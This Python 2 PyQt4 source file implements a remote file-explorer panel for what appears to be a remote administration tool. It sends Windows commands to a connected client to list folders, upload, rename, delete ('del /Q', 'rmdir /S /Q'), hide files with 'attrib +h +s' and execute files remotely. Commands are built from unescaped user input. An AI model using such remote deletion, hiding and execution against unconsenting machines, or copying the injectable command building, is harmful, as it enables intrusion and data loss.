from PyQt4.QtGui import *
from PyQt4.QtCore import *
from main_ui import Ui_Form
import ast
import os
import string
import random
from libs.language import Translate

# Multi Lang
translate = Translate()
_ = lambda _word: translate.word(_word)

def id_generator(size=16, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

def sizeof_fmt(num, suffix=_('MEXPLORER_B')):
            for unit in ['', _('MEXPLORER_K'),
                         _('MEXPLORER_M'),
                         _('MEXPLORER_G'),
                         _('MEXPLORER_T'),
                         _('MEXPLORER_P'),
                         _('MEXPLORER_E'),
                         _('MEXPLORER_Z'),]:
                if abs(num) < 1024.0:
                    return "%3.1f%s%s" % (num, unit, suffix)
                num /= 1024.0
            return "%.1f%s%s" % (num, 'Yi', suffix)


class mainPopup(QWidget, Ui_Form):
    def __init__(self, args):
        QWidget.__init__(self)
        self.setupUi(self)

        self.moderator = args['moderator']
        self.client = args['client']
        self.session_id = args['session_id']
        self.module_id = args['module_id']
        self.assets = args['assets']

        self.setWindowTitle(_('MEXPLORER_TITLE'))

        self.gui = QApplication.processEvents

        self.set_language()

        self.upButton.clicked.connect(self.parent_folder)
        self.explorerTable.doubleClicked.connect(self.open_folder)
        self.explorerPathEntry.returnPressed.connect(self.open_path)
        self.connect(self.explorerDrivesDrop, SIGNAL('currentIndexChanged(int)'), self.drive_change)

        self.explorerTable.setContextMenuPolicy(Qt.CustomContextMenu)
        self.connect(self.explorerTable, SIGNAL('customContextMenuRequested(const QPoint&)'), self.right_click_menu)

        self.get_content()

        #self.setAcceptDrops(True)

    def signal(self, data):
        self.callback(data)

    def set_language(self):
        self.explorerTable.horizontalHeaderItem(0).setText(_('MEXPLORER_TYPE'))
        self.explorerTable.horizontalHeaderItem(1).setText(_('MEXPLORER_NAME'))
        self.explorerTable.horizontalHeaderItem(2).setText(_('MEXPLORER_DATE_MODIFIED'))
        self.explorerTable.horizontalHeaderItem(3).setText(_('MEXPLORER_SIZE'))
        self.fileLabel.setText(_('MEXPLORER_FILE'))
        self.dirLabel.setText(_('MEXPLORER_FOLDER'))
        self.hfileLabel.setText(_('MEXPLORER_HIDDEN_FILE'))
        self.hdirLabel.setText(_('MEXPLORER_HIDDEN_FOLDER'))
        self.selectedLabel.setText(_('MEXPLORER_SELECTED'))
        self.dirfilesLabel.setText(_('MEXPLORER_FOLDERS_FILES'))
    #
    # def dragEnterEvent(self, event):
    #     if event.mimeData().hasUrls:
    #         event.accept()
    #     else:
    #         event.ignore()
    #
    # def dragMoveEvent(self, event):
    #     self.explorerTable.setVisible(False)
    #     if event.mimeData().hasUrls:
    #         event.setDropAction(Qt.CopyAction)
    #         event.accept()
    #     else:
    #         event.ignore()
    #     self.explorerTable.setVisible(True)
    #
    # def dropEvent(self, event):
    #     if event.mimeData().hasUrls:
    #         event.setDropAction(Qt.CopyAction)
    #         event.accept()
    #         for url in event.mimeData().urls():
    #             self.upload(url.toLocalFile())
    #     else:
    #         event.ignore()

    def right_click_menu(self, point):
        try:
            _type = str(self.explorerTable.item(self.explorerTable.currentItem().row(), 0).text())
            self.emenu = QMenu(self)

            # File commands
            if '<FILE>' in _type:
                pass
                #self.emenu.addAction(QIcon(os.path.join(self.assets, 'download.png')), _('MEXPLORER_DOWNLOAD'), self.download)

            # Folder commands
            elif '<DIR>' in _type:
                pass
                #self.emenu.addAction(QIcon(os.path.join(self.assets, 'open.png')), _('MEXPLORER_OPEN_FOLDER'), self.open_folder)

            # Global commands
            self.emenu.addAction(QIcon(os.path.join(self.assets, 'execute.png')), _('MEXPLORER_EXECUTE'), self.execute_remotely)
            self.emenu.addAction(QIcon(os.path.join(self.assets, 'set_alias.png')), _('MEXPLORER_RENAME'), self.rename)
            self.emenu.addAction(QIcon(os.path.join(self.assets, 'eye.png')), _('MEXPLORER_HIDDEN'), self.hidden)
            self.emenu.addAction(QIcon(os.path.join(self.assets, 'trash.png')), _('MEXPLORER_DELETE'), self.remove)
            self.emenu.addSeparator()
            self.emenu.addAction(QIcon(os.path.join(self.assets, 'add_file.png')), _('MEXPLORER_CREATE_FILE'), self.create_file)
            self.emenu.addAction(QIcon(os.path.join(self.assets, 'add_folder.png')), _('MEXPLORER_CREATE_FOLDER'), self.create_dir)
            self.emenu.addAction(QIcon(os.path.join(self.assets, 'add_folder.png')), _('MEXPLORER_CREATE_FOLDER'), self.upload)

            self.emenu.exec_(self.explorerTable.mapToGlobal(point))

        except AttributeError:
            pass

    def refresh(self):
        self.get_content()

    def empty(self):
        pass

    def upload(self):
        file_name = str(QFileDialog.getOpenFileName(self, _('MEXPLORER_CHOOSE_FILE'), ''))
        name_of_file = str(file_name).split('\\')[-1].split('/')[-1]
        session = id_generator()

        if file_name and os.path.exists(file_name):
            payload = {
                    'file_name': name_of_file,
                    'session': session,
                }
            bin = open(file_name, 'rb')
            print 'open file for read'
            while 1:
                data = bin.read(1024)
                if not data:
                    payload['raw_data'] = 'downloadFinished'
                    print 'upload finished'
                    break
                else:
                    payload['raw_data'] = data
                self.moderator.send_msg(payload, 'downloadMode', session_id=self.session_id, _to=self.client, module_id=self.module_id)
                print 'sent data'
                self.callback = self.empty
            self.callback=self.recv_content


    def create_file(self):
        text, ok = QInputDialog.getText(self, _('MEXPLORER_MSG_NEW_FILE'), _('MEXPLORER_MSG_NEW_FILE'), QLineEdit.Normal)
        if ok:
            self.moderator.send_msg('type Nul > %s' % text, 'explorerMode', session_id=self.session_id, _to=self.client, module_id=self.module_id)
            self.callback = self.recv_content

    def create_dir(self):
        text, ok = QInputDialog.getText(self, _('MEXPLORER_MSG_NEW_FOLDER'), _('MEXPLORER_MSG_NEW_FOLDER'), QLineEdit.Normal)
        if ok:
            self.moderator.send_msg('mkdir %s' % text, 'explorerMode', session_id=self.session_id, _to=self.client, module_id=self.module_id)
            self.callback = self.recv_content

    def rename(self):
        target = self.explorerTable.item(self.explorerTable.currentItem().row(), 1).text()
        text, ok = QInputDialog.getText(self, _('MEXPLORER_MSG_RENAME'), _('MEXPLORER_MSG_RENAME_WITH'), QLineEdit.Normal, target)
        if ok:
            self.moderator.send_msg('rename %s %s' % (target, text), 'explorerMode', session_id=self.session_id, _to=self.client, module_id=self.module_id)
            self.callback = self.recv_content

    def hidden(self):
        item = self.explorerTable.item(self.explorerTable.currentItem().row(), 1)
        _file = str(item.text())
        hidden_color = item.textColor().name()
        if hidden_color in ['#3498db', '#9b59b6']:
            self.moderator.send_msg('attrib -h -s {}'.format(_file), 'explorerMode', session_id=self.session_id, _to=self.client, module_id=self.module_id)
        else:
            self.moderator.send_msg('attrib +h +s {}'.format(_file), 'explorerMode', session_id=self.session_id, _to=self.client, module_id=self.module_id)
        self.callback = self.recv_content

    # Execute File Remotely
    def execute_remotely(self):
        _file = str(self.explorerTable.item(self.explorerTable.currentItem().row(), 1).text())
        self.moderator.send_msg('start /d %CD% {}'.format(_file), 'explorerMode', session_id=self.session_id, _to=self.client, module_id=self.module_id)
        self.callback = self.recv_content

    def remove(self):
        try:
            _type = str(self.explorerTable.item(self.explorerTable.currentItem().row(), 0).text())
            _file = str(self.explorerTable.item(self.explorerTable.currentItem().row(), 1).text())

            warn = QMessageBox(QMessageBox.Question, _('MEXPLORER_MSG_CONFIRM'), _('MEXPLORER_MSG_DELETE'))
            warn.setStandardButtons(QMessageBox.Yes | QMessageBox.No)
            ans = warn.exec_()
            if ans == QMessageBox.Yes:
                if '<FILE>' in _type:
                    self.moderator.send_msg('del /Q "%s"' % _file, 'explorerMode', session_id=self.session_id, _to=self.client, module_id=self.module_id)
                elif '<DIR>' in _type:
                    self.moderator.send_msg('rmdir /S /Q "%s"' % _file, 'explorerMode', session_id=self.session_id, _to=self.client, module_id=self.module_id)
                self.callback = self.recv_content
            else:
                return
        except AttributeError:
            warn = QMessageBox(QMessageBox.Warning, _('MEXPLORER_MSG_ERROR'), _('MEXPLORER_MSG_NO_FILE'), QMessageBox.Ok)
            warn.exec_()

    # open remote folder
    def open_folder(self):

        # Get folder name
        _type = self.explorerTable.item(self.explorerTable.currentItem().row(), 0).text()
        _name = self.explorerTable.item(self.explorerTable.currentItem().row(), 1).text()

        if '<DIR>' in _type:
            # Choose new folder
            self.moderator.send_msg('cd %s' % _name, 'explorerMode', session_id=self.session_id, _to=self.client, module_id=self.module_id)
            self.callback = self.recv_content

    # open remote folder from path entry
    def open_path(self):
        self.moderator.send_msg('cd %s' % str(self.explorerPathEntry.text()), 'explorerMode', session_id=self.session_id, _to=self.client, module_id=self.module_id)
        self.callback = self.recv_content

    # open parent folder
    def parent_folder(self):
        self.moderator.send_msg('cd ..', 'explorerMode', session_id=self.session_id, _to=self.client, module_id=self.module_id)
        self.callback = self.recv_content

    # Change Drive
    def drive_change(self):
        if not self.comboInEditMode:
            self.moderator.send_msg('cd ' + str(self.explorerDrivesDrop.itemText(self.explorerDrivesDrop.currentIndex())),
                       'explorerMode', session_id=self.session_id, _to=self.client, module_id=self.module_id)
            self.callback = self.recv_content

    def get_content(self):
        self.moderator.send_msg('getContent', 'explorerMode', session_id=self.session_id, _to=self.client, module_id=self.module_id)
        self.callback = self.recv_content

    def recv_content(self, data):
        # set remote path entry
        try:
            content = ast.literal_eval(data['payload'])
        except (SyntaxError, ValueError):
            warn = QMessageBox(QMessageBox.Warning, _('MEXPLORER_OPEN_FOLDER_ERROR'), _('MEXPLORER_OPEN_FOLDER_ERROR'))
            warn.exec_()
            return
        # Init Logical Drives
        self.comboInEditMode = True
        self.explorerDrivesDrop.clear()
        for drive_letter in content['logicalDrives'].keys():
            self.explorerDrivesDrop.addItem(drive_letter)

        # Get active drive caption
        self.explorerDrivesDrop.setCurrentIndex(
            self.explorerDrivesDrop.findText(content['path'].split('\\')[0]+'\\', Qt.MatchFixedString))


        # Initializing table
        self.explorerTable.clearContents()
        self.explorerTable.sortItems(0)
        self.explorerPathEntry.setText(content['path'])

        # Turn combo signal off
        self.comboInEditMode = False

        # set tables row count
        self.explorerTable.setRowCount(len(content) - 2)

        file_count = 0
        folder_count = 0

        # add content to table
        for index in content:

            if index == 'path' or index == 'logicalDrives':
                continue

            if content[index]['hidden']:
                file_color = QColor('#9b59b6')
                file_icon = os.path.join(self.assets, 'hidden_file.png')
                folder_color = QColor('#3498db')
                folder_icon = os.path.join(self.assets, 'hidden_folder.png')
            else:
                file_color = QColor('#ecf0f1')
                file_icon = os.path.join(self.assets, 'file.png')
                folder_color = QColor('#e67e22')
                folder_icon = os.path.join(self.assets, 'folder.png')

            # set content type
            item = QTableWidgetItem('<FILE>') if content[index]['type'] else QTableWidgetItem('<DIR>')
            if content[index]['type']:
                item.setTextColor(file_color)
                item.setSizeHint(QSize(50, 30))
                file_count += 1
            else:
                item.setTextColor(folder_color)
                item.setSizeHint(QSize(50, 30))
                folder_count += 1
            item.setTextAlignment(Qt.AlignCenter | Qt.AlignVCenter)
            self.explorerTable.setItem(index, 0, item)

            # set content name
            item = QTableWidgetItem(content[index]['name'])
            if content[index]['type']:
                item.setTextColor(file_color)
                item.setIcon(QIcon(QPixmap(file_icon)))
            else:
                item.setTextColor(folder_color)
                item.setIcon(QIcon(QPixmap(folder_icon)))
            self.explorerTable.setItem(index, 1, item)

            # set content modified date
            item = QTableWidgetItem(content[index]['modified'])
            item.setTextAlignment(Qt.AlignCenter)
            item.setSizeHint(QSize(220, 30))
            self.explorerTable.setItem(index, 2, item)

            # set file size
            item = QTableWidgetItem(sizeof_fmt(content[index]['size'])) if content[index]['type'] else QTableWidgetItem('')
            item.setTextAlignment(Qt.AlignRight | Qt.AlignVCenter)
            item.setTextColor(file_color)
            self.explorerTable.setItem(index, 3, item)

        # update table
        self.explorerTable.horizontalHeaderItem(3).setTextAlignment(Qt.AlignCenter)
        self.explorerTable.resizeColumnsToContents()

        # set folders & files count
        self.dirfilesCountLabel.setText('{0}/{1}'.format(folder_count, file_count))
